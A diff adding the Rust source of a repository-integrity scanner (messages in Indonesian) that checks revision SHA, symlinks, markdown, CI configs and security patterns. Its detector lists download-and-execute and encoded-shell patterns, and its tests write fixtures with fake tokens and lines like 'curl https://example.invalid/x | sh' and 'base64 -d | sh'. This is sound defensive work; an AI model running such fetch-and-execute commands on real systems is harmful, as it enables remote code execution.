@@ -1,0 +1,128 @@
+use std::{fs, path::{Path, PathBuf}, process::Command};
+
+#[derive(Debug)]
+struct Finding { detector: &'static str, rule: &'static str, severity: &'static str, path: String, line: usize, summary: String, evidence: String, fix: String }
+const DETECTORS: &[&str] = &["revision-integrity","path-integrity","file-integrity","markdown-links","markdown-structure","workflow-integrity","contract-drift","artifact-integrity","security-patterns"];
+fn selected(scope: &str) -> Option<Vec<&'static str>> { Some(match scope {
+    "all" => DETECTORS.to_vec(), "security" => vec!["security-patterns"], "sha" => vec!["revision-integrity"], "workflow" => vec!["workflow-integrity"],
+    "structure" => vec!["path-integrity","file-integrity","contract-drift"],
+    "documentation" => vec!["markdown-links","markdown-structure","file-integrity"],
+    "artifacts" => vec!["artifact-integrity","revision-integrity"], "contracts" => vec!["contract-drift","file-integrity"],
+    "markdown" => vec!["markdown-links","markdown-structure"], "readme" => vec!["markdown-links","markdown-structure","file-integrity"], _ => return None,
+})}
+// The constructor mirrors the Finding fields one-to-one; keep this localized exception rather than suppressing Clippy crate-wide.
+#[allow(clippy::too_many_arguments)]
+fn finding(d: &'static str,r: &'static str,s: &'static str,p: String,l: usize,m: &str,e: &str,f: &str)->Finding { Finding{detector:d,rule:r,severity:s,path:p,line:l,summary:m.into(),evidence:e.into(),fix:f.into()} }
+fn rel(root:&Path,path:&Path)->String { path.strip_prefix(root).unwrap_or(path).to_string_lossy().replace('\\',"/") }
+fn files(root:&Path)->Result<(Vec<PathBuf>,Vec<PathBuf>),String>{
+ let mut stack=vec![root.to_path_buf()];let mut out=Vec::new();let mut symlinks=Vec::new();
+ while let Some(dir)=stack.pop(){for entry in fs::read_dir(&dir).map_err(|e|format!("{}: {e}",dir.display()))?{
+  let entry=entry.map_err(|e|e.to_string())?;let path=entry.path();
+  if matches!(entry.file_name().to_str(),Some(".git"|"target"|".venv"|"venv"|"node_modules"|"__pycache__")){continue;}
+  let meta=fs::symlink_metadata(&path).map_err(|e|format!("{}: {e}",path.display()))?;
+  if meta.file_type().is_symlink(){symlinks.push(path);continue;}if meta.is_dir(){stack.push(path);}else if meta.is_file(){out.push(path);}
+ }}out.sort();symlinks.sort();Ok((out,symlinks))
+}
+fn head_sha(root:&Path)->Option<String>{let o=Command::new("git").arg("-C").arg(root).args(["rev-parse","--verify","HEAD"]).output().ok()?;if !o.status.success(){return None;}let s=String::from_utf8(o.stdout).ok()?.trim().to_owned();(s.len()==40&&s.bytes().all(|b|b.is_ascii_hexdigit())).then_some(s)}
+type ScanResult = Result<(Vec<Finding>, Vec<&'static str>, Option<String>), String>;
+fn scan(root:&Path,scope:&str,expected:Option<&str>)->ScanResult{
+ let run=selected(scope).ok_or_else(||format!("scope tidak dikenal: {scope}"))?;
+ let skipped=DETECTORS.iter().copied().filter(|d|!run.contains(d)).collect::<Vec<_>>();
+ let root=fs::canonicalize(root).map_err(|e|format!("root tidak valid: {e}"))?; let (all,symlinks)=files(&root)?;let head=head_sha(&root);let mut out=Vec::new();
+ if run.contains(&"revision-integrity"){match(expected,head.as_deref()){
+  (Some(w),Some(a)) if w.eq_ignore_ascii_case(a)=>{},
+  (Some(w),Some(a))=>out.push(finding("revision-integrity","expected-sha-mismatch","critical",".".into(),0,"HEAD tidak cocok dengan SHA target.",&format!("expected={w}; actual={a}"),"Periksa checkout dan ulangi pada commit yang benar.")),
+  (Some(w),None)=>out.push(finding("revision-integrity","head-unavailable","high",".".into(),0,"HEAD tidak dapat diverifikasi melalui Git.",w,"Jalankan dari checkout Git yang valid.")),
+  (None,_)=>out.push(finding("revision-integrity","expected-sha-not-supplied","info",".".into(),0,"SHA target tidak diberikan.",head.as_deref().unwrap_or("HEAD unavailable"),"Gunakan --expected-sha untuk audit exact-SHA.")),
+ }}
+ if run.contains(&"path-integrity"){for p in &symlinks{let target=fs::canonicalize(p);match target{Ok(resolved) if !resolved.starts_with(&root)=>out.push(finding("path-integrity","symlink-escapes-root","high",rel(&root,p),0,"Symlink mengarah ke luar root repositori.",&resolved.to_string_lossy(),"Hapus atau perbaiki symlink agar target tetap di dalam root.")),Err(_)=>out.push(finding("path-integrity","symlink-target-unresolved","medium",rel(&root,p),0,"Target symlink tidak dapat diresolusi.",&fs::read_link(p).map(|v|v.to_string_lossy().into_owned()).unwrap_or_else(|_|"read_link gagal".into()),"Periksa dan perbaiki target symlink.")),_=>out.push(finding("path-integrity","symlink-not-followed","info",rel(&root,p),0,"Symlink internal tidak diikuti saat pemindaian.",&fs::read_link(p).map(|v|v.to_string_lossy().into_owned()).unwrap_or_else(|_|"read_link gagal".into()),"Tinjau target jika relevan."))}}for p in ["Cargo.toml","README.md","AGENTS.md","docs/ONE_CONSTITUTION.md","crates/one-core/src/lib.rs"]{if !root.join(p).is_file(){out.push(finding("path-integrity","required-path-missing","high",p.into(),0,"Jalur fondasi wajib tidak ditemukan.",p,"Pulihkan file atau tinjau kontrak fondasi."));}}}
+ if run.contains(&"file-integrity"){for p in &all{if matches!(p.extension().and_then(|v|v.to_str()),Some("md"|"toml"|"json"|"yml"|"yaml"|"one"|"rs"))&&fs::read_to_string(p).is_err(){out.push(finding("file-integrity","text-not-utf8","medium",rel(&root,p),0,"File teks tidak dapat dibaca sebagai UTF-8.","read_to_string gagal","Periksa encoding dan pulihkan UTF-8 valid."));}}}
+ if run.contains(&"markdown-links")||run.contains(&"markdown-structure"){for p in &all{if p.extension().and_then(|v|v.to_str())!=Some("md"){continue;}let Ok(text)=fs::read_to_string(p)else{continue};let rp=rel(&root,p);
+  if run.contains(&"markdown-structure"){let mut open:Option<(u8,usize)>=None;for(i,line)in text.lines().enumerate(){let t=line.trim_start();let b=t.as_bytes();let marker=if b.starts_with(&[96,96,96]){Some(96)}else if t.starts_with("~~~"){Some(126)}else{None};if let Some(m)=marker{let n=b.iter().take_while(|v|**v==m).count();if n>=3{if let Some((old,_))=open{if old==m&&b.iter().all(|v|*v==m||v.is_ascii_whitespace()){open=None;}}else{open=Some((m,i+1));}}}}if let Some((m,l))=open{out.push(finding("markdown-structure","unclosed-code-fence","medium",rp.clone(),l,"Markdown code fence tidak ditutup.",m.to_string().as_str(),"Tambahkan fence penutup yang cocok."));}}
+  if run.contains(&"markdown-links"){for(i,line)in text.lines().enumerate(){let mut rest=line;while let Some(start)=rest.find("]("){rest=&rest[start+2..];let Some(end)=rest.find(')')else{break};let target=rest[..end].trim().trim_matches('<').trim_matches('>');rest=&rest[end+1..];if target.is_empty()||target.starts_with('#')||target.starts_with("//")||target.starts_with("http:")||target.starts_with("https:")||target.starts_with("mailto:"){continue;}let local=target.split('#').next().unwrap_or("").split('?').next().unwrap_or("");if !local.is_empty()&&!p.parent().unwrap_or(&root).join(local).exists(){out.push(finding("markdown-links","broken-relative-link","medium",rp.clone(),i+1,"Tautan relatif tidak ditemukan.",target,"Perbaiki target relatif atau hapus tautan usang."));}}}
+ }}}
+ if run.contains(&"workflow-integrity"){for p in &all{let rp=rel(&root,p);let github_workflow=rp.starts_with(".github/workflows/");let circleci_config=rp==".circleci/config.yml";if (!github_workflow&&!circleci_config)||!matches!(p.extension().and_then(|v|v.to_str()),Some("yml"|"yaml")){continue;}let Ok(t)=fs::read_to_string(p)else{continue};if github_workflow&&!t.lines().any(|l|l.trim_start().starts_with("name:")){out.push(finding("workflow-integrity","workflow-name-missing","medium",rp.clone(),1,"Workflow tidak memiliki name yang terlihat.","name: tidak ditemukan","Tambahkan nama workflow eksplisit."));}if circleci_config{let valid_version=t.lines().filter_map(|line|line.trim().strip_prefix("version:")).map(|v|v.trim().trim_matches('"').trim_matches('\'')).any(|v|matches!(v,"2"|"2.0"|"2.1"));let has_jobs=t.lines().any(|line|line.trim()=="jobs:");if !valid_version{out.push(finding("workflow-integrity","circleci-version-invalid","high",rp.clone(),1,"Versi konfigurasi CircleCI tidak ditemukan atau tidak didukung.","version harus 2, 2.0, atau 2.1","Gunakan versi konfigurasi CircleCI yang didukung dan validasi pada CircleCI."));}if !has_jobs{out.push(finding("workflow-integrity","circleci-jobs-missing","high",rp.clone(),1,"Konfigurasi CircleCI tidak memiliki bagian jobs.","jobs: tidak ditemukan","Tambahkan definisi jobs yang valid dan validasi pada CircleCI."));}}if github_workflow{for(i,line)in t.lines().enumerate(){if let Some(target)=line.trim().strip_prefix("uses: ./"){let target=target.split_whitespace().next().unwrap_or(target);if !root.join(target).exists(){out.push(finding("workflow-integrity","local-action-missing","high",rp.clone(),i+1,"Local action tidak ditemukan.",target,"Pulihkan action atau perbaiki referensi."));}}}}}}
+ if run.contains(&"contract-drift"){let r=fs::read_to_string(root.join("README.md")).unwrap_or_default();for c in ["one buat","one periksa","one jalankan","one test","one bangun","one package","one version","one help"]{if !r.contains(c){out.push(finding("contract-drift","cli-doc-command-missing","medium","README.md".into(),0,"Dokumentasi tidak memuat perintah CLI inti.",c,"Selaraskan README dengan kontrak CLI."));}}}
+
+ if run.contains(&"security-patterns"){for p in &all{
+  let rp=rel(&root,p);
+  let ext=p.extension().and_then(|v|v.to_str()).unwrap_or("");
+  if !matches!(ext, "rs"|"one"|"py"|"js"|"ts"|"jsx"|"tsx"|"sh"|"ps1"|"yml"|"yaml"|"toml"|"json"|"md"|"txt"|"env"|"cfg"|"ini"|"go"|"java"|"c"|"h"|"cpp"|"cs"|"rb"|"php"|"pl"|"bat"|"cmd"){continue;}
+  let Ok(t)=fs::read_to_string(p) else {continue};
+  for (i,line) in t.lines().enumerate(){
+   let lower=line.to_ascii_lowercase();
+   let trimmed=line.trim();
+   let private_key=trimmed.starts_with("-----BEGIN ") && trimmed.ends_with("PRIVATE KEY-----");
+   let token_prefix=["ghp_","github_pat_","gho_","ghu_","ghs_","ghr_","sk_live_","sk_test_","xoxb-","xoxp-","akia"];
+   let known_token=token_prefix.iter().any(|prefix|lower.find(prefix).map(|at| lower[at+prefix.len()..].chars().take_while(|c|c.is_ascii_alphanumeric()).count()>=20).unwrap_or(false));
+   let script_like=matches!(ext,"sh"|"ps1"|"bat"|"cmd"|"yml"|"yaml");
+   let pipe_shell=script_like && (lower.contains("curl ")||lower.contains("wget ")) && (lower.contains("| sh")||lower.contains("|bash")||lower.contains("| bash")||lower.contains("|sh"));
+   let encoded_shell=script_like && ((lower.contains("base64 -d")||lower.contains("base64 --decode")) && (lower.contains("| sh")||lower.contains("|bash")||lower.contains("| bash")) || (lower.contains("python -c")||lower.contains("python3 -c")) && (lower.contains("exec(")||lower.contains("eval(")) && (lower.contains("base64")||lower.contains("urllib")||lower.contains("requests.get")));
+   let encoded_powershell=matches!(ext,"ps1"|"bat"|"cmd"|"yml"|"yaml") && (lower.contains("-encodedcommand")||lower.contains(" -enc "));
+   let workflow_write_all=rp.starts_with(".github/workflows/") && lower.contains("permissions: write-all");
+   if private_key || known_token {
+    out.push(finding("security-patterns",if private_key{"embedded-private-key"}else{"known-token-pattern"},"high",rp.clone(),i+1,"Kemungkinan kredensial rahasia tertanam; nilai disamarkan.","[REDACTED: nilai rahasia tidak ditampilkan]","Cabut/rotasi kredensial yang valid, hapus dari riwayat Git, dan gunakan secret store."));
+   } else if pipe_shell || encoded_shell || encoded_powershell {
+    out.push(finding("security-patterns","download-and-execute-pattern","high",rp.clone(),i+1,"Pola unduh-lalu-eksekusi atau PowerShell encoded terdeteksi.","[baris berisi pola eksekusi mencurigakan disamarkan]","Tinjau sumber, konteks, dan perubahan terkait sebelum menjalankan; gunakan sumber terverifikasi."));
+   } else if workflow_write_all {
+    out.push(finding("security-patterns","workflow-write-all-permissions","medium",rp.clone(),i+1,"Workflow memberi seluruh izin token melalui write-all.","permissions: write-all","Batasi permissions ke izin minimum yang diperlukan."));
+   } else if (lower.contains("password")||lower.contains("api_key")||lower.contains("api-key")||lower.contains("access_token")||lower.contains("client_secret")||lower.contains("private_key")) && (line.contains("=")||line.contains(":")) {
+    let key=line.split_once('=').map(|x|x.0.trim()).or_else(||line.split_once(':').map(|x|x.0.trim())).unwrap_or("");
+    let key=key.trim_matches('"');
+    let key_valid=!key.is_empty()&&key.chars().all(|c|c.is_ascii_alphanumeric()||c=='_'||c=='-');
+    let value=line.split_once('=').map(|x|x.1.trim()).or_else(||line.split_once(':').map(|x|x.1.trim())).unwrap_or("");
+    let cleaned=value.trim_matches(|c:char|c.is_whitespace()||c=='"'||c==','||c==';');
+    let placeholder=["your_","example","placeholder","changeme","replace_me","<","${","env(","os.environ","process.env","secrets.","null","none","xxxx"];
+    if key_valid && cleaned.len()>=16 && !placeholder.iter().any(|x|cleaned.to_ascii_lowercase().contains(x)) && cleaned.bytes().any(|b|b.is_ascii_alphanumeric()) {
+     out.push(finding("security-patterns","possible-hardcoded-secret","high",rp.clone(),i+1,"Kemungkinan rahasia hardcoded; nilai sengaja tidak ditampilkan.","[REDACTED: kemungkinan kredensial]","Validasi temuan secara lokal, rotasi jika valid, dan pindahkan ke secret store."));
+    }
+   }
+  }
+ }}
+ if run.contains(&"artifact-integrity")&&!root.join("Cargo.lock").is_file(){out.push(finding("artifact-integrity","cargo-lock-missing","medium","Cargo.lock".into(),0,"Cargo.lock tidak ditemukan.","lockfile hilang","Tambahkan lockfile yang sesuai toolchain."));}
+ out.sort_by(|a,b|(&a.path,a.line,a.detector,a.rule).cmp(&(&b.path,b.line,b.detector,b.rule)));Ok((out,skipped,head))
+}
+pub(crate) fn run(args:impl IntoIterator<Item=String>)->u8{
+ let mut args=args.into_iter();let mut scope="all".to_owned();let mut root=PathBuf::from(".");let mut expected=None;
+ while let Some(a)=args.next(){match a.as_str(){
+ "--scope"=>{let Some(v)=args.next()else{eprintln!("ONE-INTEGRITY: --scope membutuhkan nilai");return 2;};scope=v;},
+ "--root"=>{let Some(v)=args.next()else{eprintln!("ONE-INTEGRITY: --root membutuhkan direktori");return 2;};root=PathBuf::from(v);},
+ "--expected-sha"=>{let Some(v)=args.next()else{eprintln!("ONE-INTEGRITY: --expected-sha membutuhkan SHA");return 2;};if v.len()!=40||!v.bytes().all(|b|b.is_ascii_hexdigit()){eprintln!("ONE-INTEGRITY: SHA harus 40 digit heksadesimal");return 2;}expected=Some(v);},
+ "--help"|"-h"=>{println!("one-integrity [--scope all|security|sha|workflow|structure|documentation|artifacts|contracts|markdown|readme] [--root DIR] [--expected-sha FULL_SHA]");return 0;},
+ _=>{eprintln!("ONE-INTEGRITY: opsi tidak dikenal '{a}'");return 2;}
+ }}
+ match scan(&root,&scope,expected.as_deref()){Ok((findings,skipped,head))=>{println!("ONE Integrity Engine (native preview)\nroot: {}\nscope: {}\nHEAD: {}\ndetectors_run: {}\ndetectors_not_requested: {}\nfindings: {}",root.display(),scope,head.as_deref().unwrap_or("UNAVAILABLE"),selected(&scope).unwrap_or_default().join(", "),skipped.join(", "),findings.len());for f in &findings{println!("[{}] {} {}:{} [{}] {}\n  evidence: {}\n  recommendation: {}",f.severity.to_uppercase(),f.detector,f.path,f.line,f.rule,f.summary,f.evidence,f.fix);}if findings.is_empty(){println!("Tidak ada temuan pada detector yang dijalankan; detector yang tidak diminta bukan berarti lulus.");}if findings.iter().any(|f|f.severity=="critical"||f.severity=="high"){1}else{0}},Err(e)=>{eprintln!("ONE-INTEGRITY: {e}");2}}
+}
+#[cfg(test)]mod tests{use super::*;#[test]fn scopes_are_explicit_and_fail_closed(){assert_eq!(selected("security").unwrap(),vec!["security-patterns"]);assert_eq!(selected("sha").unwrap(),vec!["revision-integrity"]);assert!(selected("markdown").unwrap().contains(&"markdown-links"));assert!(selected("unknown").is_none());}
+#[test]fn finds_broken_markdown_link_and_unclosed_fence(){let root=std::env::temp_dir().join(format!("one-integrity-test-{}",std::process::id()));let _=fs::remove_dir_all(&root);fs::create_dir_all(&root).unwrap();fs::write(root.join("test.md"),"[broken](missing.md)\n~~~rs\ncode\n").unwrap();let(f,s,_)=scan(&root,"markdown",None).unwrap();assert!(f.iter().any(|x|x.rule=="broken-relative-link"));assert!(f.iter().any(|x|x.rule=="unclosed-code-fence"));assert!(s.contains(&"revision-integrity"));fs::remove_dir_all(root).unwrap();}
+
+#[test]fn security_scope_redacts_secret_values_and_detects_download_execution(){let root=std::env::temp_dir().join(format!("one-security-test-{}",std::process::id()));let _=fs::remove_dir_all(&root);fs::create_dir_all(&root).unwrap();fs::write(root.join("sample.sh"),"API_KEY=ghp_".to_owned()+"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\nPASSWORD=madeupsecretvalue123456789\n-----BEGIN "+"PRIVATE KEY-----\ncurl https://example.invalid/x | sh\n").unwrap();let(f,_,_)=scan(&root,"security",None).unwrap();assert!(f.iter().any(|x|x.rule=="known-token-pattern"));assert!(f.iter().any(|x|x.rule=="embedded-private-key"));assert!(f.iter().any(|x|x.rule=="possible-hardcoded-secret"));assert!(f.iter().any(|x|x.rule=="download-and-execute-pattern"));fs::write(root.join("encoded.sh"),"printf payload | base64 -d | sh\\n").unwrap();let(g,_,_)=scan(&root,"security",None).unwrap();assert!(g.iter().any(|x|x.rule=="download-and-execute-pattern"));assert!(f.iter().all(|x|!x.evidence.contains("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")&&!x.evidence.contains("madeupsecretvalue123456789")));fs::remove_dir_all(root).unwrap();}
+#[test]
+fn circleci_config_accepts_implicit_single_job_workflow_and_checks_supported_versions(){
+ let root=std::env::temp_dir().join(format!("one-circleci-test-{}",std::process::id()));
+ let _=fs::remove_dir_all(&root);
+ fs::create_dir_all(root.join(".circleci")).unwrap();
+ fs::write(root.join(".circleci/config.yml"),"version: 2.1\njobs:\n  build:\n    machine: true\n    steps:\n      - checkout\n").unwrap();
+ let (valid,_,_)=scan(&root,"workflow",None).unwrap();
+ assert!(!valid.iter().any(|f|f.rule=="circleci-version-invalid"||f.rule=="circleci-jobs-missing"));
+ fs::write(root.join(".circleci/config.yml"),"version: '2.0'\njobs:\n  build:\n    steps: []\n").unwrap();
+ let (supported,_,_)=scan(&root,"workflow",None).unwrap();
+ assert!(!supported.iter().any(|f|f.rule=="circleci-version-invalid"||f.rule=="circleci-jobs-missing"));
+ fs::write(root.join(".circleci/config.yml"),"version: 3.0\nworkflows:\n").unwrap();
+ let (invalid,_,_)=scan(&root,"workflow",None).unwrap();
+ assert!(invalid.iter().any(|f|f.rule=="circleci-version-invalid"));
+ assert!(invalid.iter().any(|f|f.rule=="circleci-jobs-missing"));
+ fs::remove_dir_all(root).unwrap();
+}
+#[cfg(unix)]
+#[test]
+fn reports_symlink_escape_without_traversing_target(){
+ use std::os::unix::fs::symlink;
+ let root=std::env::temp_dir().join(format!("one-integrity-link-{}",std::process::id()));
+ let outside=std::env::temp_dir().join(format!("one-integrity-outside-{}",std::process::id()));
+ let _=fs::remove_dir_all(&root);let _=fs::remove_dir_all(&outside);fs::create_dir_all(&root).unwrap();fs::create_dir_all(&outside).unwrap();fs::write(outside.join("private.txt"),"not scanned").unwrap();symlink(&outside,root.join("external")).unwrap();
+ let (findings,_,_)=scan(&root,"structure",None).unwrap();
+ assert!(findings.iter().any(|f|f.rule=="symlink-escapes-root"));
+ fs::remove_dir_all(root).unwrap();fs::remove_dir_all(outside).unwrap();
+}
+}
